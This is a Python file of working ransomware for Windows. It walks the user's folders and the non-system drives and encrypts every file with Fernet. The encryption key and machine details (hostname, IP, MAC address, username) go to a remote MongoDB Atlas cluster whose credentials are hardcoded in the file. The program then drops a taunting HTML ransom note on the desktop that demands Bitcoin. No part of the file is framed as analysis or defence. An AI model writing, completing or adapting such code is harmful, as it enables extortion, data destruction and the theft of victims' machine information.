import socket
import platform
import uuid
import os
import psutil
import win32com.client
from cryptography.fernet import Fernet
from datetime import datetime
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi


def paths():
    dirs = []
    user_dir = os.path.expanduser("~")
    subfolders = [
        "Documents", "Downloads", "Desktop", "Pictures", "Videos", "Music",
        "AppData\\Local", "AppData\\Roaming", "AppData\\LocalLow",
        "AppData\\Temp", "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs",
        "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    ]

    for folder in subfolders:
        path = os.path.join(user_dir, folder)
        if os.path.exists(path):
            dirs.append(path)

    sys_drive = os.getenv("SystemDrive", "C:").upper()
    partitions = psutil.disk_partitions()
    for p in partitions:
        if "cdrom" in p.opts or not os.path.exists(p.mountpoint):
            continue
        drive = p.device
        if not drive.upper().startswith(sys_drive):
            dirs.append(p.mountpoint)

    return dirs


def encryptor(file_path, key):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(file_path, "wb") as f:
            f.write(encrypted)

    except Exception as e:
        print(f"Error encrypting {file_path}: {str(e)}")


def dircryptor(paths, key):
    for path in paths:
        for root, _, files in os.walk(path):
            for file in files:
                file_path = os.path.join(root, file)
                encryptor(file_path, key)


def ranote():
    ransom_path = os.path.join(os.path.expanduser("~"), "Desktop","ClickME.html")
    with open(ransom_path, "w") as f:
        f.write("""
        <html>
        <head><title>404: Your files are now missing.</title></head>
        <body>
            <h1>Hey Loser!</h1>
            <p>Your files are gone. EVERY. SINGLE. ONE.</p>
            <p>Why? Because you couldn't resist clicking on whatever shiny garbage that came your way.</p>
            <p>No backups</p>
            <p>No antivirus worth a damn</p>
            <p>Still using 'password123' in 2025</p>
            <p><strong>Wanna fix it?</strong></p>
            <p>Send 1 Bitcoin to: <code>bc1qmfmld0305gzc74dvdqjwch3x5flvt56jtn5862</code></p>
            <p>Then, send an apology to: <code>youare@stupid.lol</code></p>
            <p>And maybe, just maybe, we'll think about giving you your files back.</p>
            <p>Haha have fun :)</p>
        </body>
        </html>
        """)
    return ransom_path


def desktop(path):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut_path = os.path.join(os.path.expanduser("~"), "Desktop", "ClickME.lnk")
    shortcut =  shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = path
    shortcut.IconLocation = "C:\\Windows\\System32\\shell32.dll"
    shortcut.save()


def machine_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                                for elements in range(0, 48, 8)][::-1])

        os_info = platform.platform()

        try:
            username = os.getlogin()
        except:
            username = "Unknown"

        return {
            "hostname": hostname,
            "ip_address": ip_address,
            "mac_address": mac_address,
            "os_info": os_info,
            "username": username
        }
    except Exception as e:
        print(f"Error collecting machine info: {str(e)}")
        return {"error": str(e)}


def atlas(encryption_key):
    uri = "mongodb+srv://gaourangbaria1002:rgAG1ac59Bvj28Wy@cluster0.jwx8zgp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

    client = MongoClient(uri, server_api=ServerApi('1'))

    try:
        client.admin.command('ping')
        print("Pinged your deployment. You successfully connected to MongoDB!")
    except Exception as e:
        print(f"Connection failed: {str(e)}")
        return

    db = client["test"]
    collection = db["encryptionkeys"]

    machine_info = machine_info()
    if "error" in machine_info:
        return

    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    document = {
        **machine_info,
        "encryption_key": encryption_key,
        "state": "secured",  
        "sent_at": current_time  
    }

    try:
        result = collection.insert_one(document)
        print(f"Document inserted with ID: {result.inserted_id}")
        return result
    except Exception as e:
        print(f"Failed to insert document: {str(e)}")
        return


if __name__ == "__main__":
    key = Fernet.generate_key()
    atlas(key.decode())

    paths_to_encrypt = paths()
    dircryptor(paths_to_encrypt, key)

    ransom_note_path = ranote()
    desktop(ransom_note_path)
